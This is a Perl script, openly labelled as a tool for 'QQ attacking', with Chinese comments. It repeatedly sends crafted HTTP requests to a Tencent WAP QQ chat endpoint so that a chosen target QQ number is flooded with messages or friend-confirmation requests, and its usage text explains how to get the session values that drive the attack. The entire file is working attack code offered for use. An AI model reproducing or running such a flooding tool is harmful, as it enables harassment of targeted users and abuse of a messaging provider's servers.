#!/usr/bin/perl
#Code By Roy<Roy@c4st.cn>
#Script For QQ Attacking

$|=1;
use Socket;
use Getopt::Std;
#获取外部参数
getopt('aytgkl');

print "\n             ===================================================\n";
print "                       Perl Script For QQ Attacking\n";
print "                          Code By Roy<Roy@c4st.cn>     \n";
print "                       Visit:luoyi.com & c4st.cn              \n";
print "             ===================================================\n";

#参数不符合要求则显示使用方法
&usage unless ( defined($opt_a) && defined($opt_y) && defined($opt_t) && defined($opt_g) && defined($opt_k));

#将外部参数赋给内部变量
$mode=$opt_a;
$time=$opt_l||1;
$urqq=$opt_y;
$targ=$opt_t;
$pg=$opt_g;
$pk=$opt_k;

#定义了攻击中使用到的服务器,waptest.tencent.com是WAPQQ免费体验用的服务器
$host="waptest.tencent.com";
$port=80;

#采用"验证请求"方式攻击
if ($mode eq "c"){
print"Attacking ...";
for ($i=1;$i<=$time;$i++){
&attack2;
}
print"\nDone!.";
}
#采用"普通消息"方式攻击
elsif ($mode eq "n"){
print"Attacking ...";
for ($i=1;$i<=$time;$i++){
&attack1;
}
print"\nDone!.";
}
else
{&usage};

#"普通消息"方式攻击函数,被攻击者将收到类似"10001 Is Coming"的信息,如果要修改信息内容,请修改Psendmsg变量
sub attack1 {
$req = "GET /cgi-bin/wapqq_chat.cgi?Pc=11&Pq=$urqq&Pg=$pg&Poq=$targ&Pk=$pk&Psendmsg=$urqq%20Is%20Coming&PMisc_mid=123456789&stn=gmcc_try HTTP/1.1\n".
       "Accept: text/vnd.wap.wml, application/vnd.wap.wmlc, image/vnd.wap.wbmp, image/gif, image/jpeg, text/vnd.wap.wmlscript, application/vnd.wap.wmlscriptc\n".
       "User-Agent: C4ST(^-^)\n".
       "Host: waptest.tencent.com\n".
       "\n\n";
print "\n";
sendraw($req);
}

#"验证请求"方式攻击函数,被攻击者将收到类似"10001 Is Coming"的信息,如果要修改信息内容,请修改PConfirmInfo变量
sub attack2 {
$req = "GET /cgi-bin/wapqq_chat.cgi?Pc=27&Pq=$urqq&Pg=$pg&Poq=$targ&Pk=$pk&PConfirmInfo=$urqq%20Is%20Coming&PMisc_mid=123456789&stn=gmcc_try HTTP/1.1\n".
       "Accept: text/vnd.wap.wml, application/vnd.wap.wmlc, image/vnd.wap.wbmp, image/gif, image/jpeg, text/vnd.wap.wmlscript, application/vnd.wap.wmlscriptc\n".
       "User-Agent: C4ST(^-^)\n".
       "Host: waptest.tencent.com\n".
       "\n\n";
print "\n";
sendraw($req);
}

#显示使用方法的函数,PG和PK的值可以在登陆WAPQQ后查看源代码而得到
sub usage {
print qq~
Usage: $0 -a <Attack Mode> -l <Loops Of Attacking> -y <Your QQ Number> -t <Target To Attack> -pg <PG For Your WAPQQ> -pk <PK For Your Session>

    -a   =Attack Mode,Choose "n" For Normal QQ Msg Type,Or Choose "c" For Confirm QQ Msg Type 
    -l   =Loops Of Attacking,The Times To Attack The Target
    -y   =Your QQ Number
    -t   =Target To Attack,QQ Number
    -g  =PG For Your WAPQQ(1)
    -k  =PK For Your Session(1)

(1)HowTo Get PG And PK:

PG is your QQ password's hash used in WAPQQ site.PK is the session id for your current visiting at WAPQQ site.You can get them once you logged on WAPQQ via your mobile,wap browser(eg.WinWAP) or wap2web service(eg.http://www.easywap.ch/Wap2Web.html).
~;
exit;
}

#Socket函数
sub sendraw { 
    my ($req) = @_; 
    my $target; 
    $target = inet_aton($host) || die("inet_aton problems\n"); 
    socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("Socket problems\n"); 
    if(connect(S,pack "SnA4x8",2,$port,$target)){ 
        select(S); 
    $| = 1; 
        print $req; 
    close(S); 
         return true;
    }
    else { 
    die("Can't connect...\n"); 
    }
}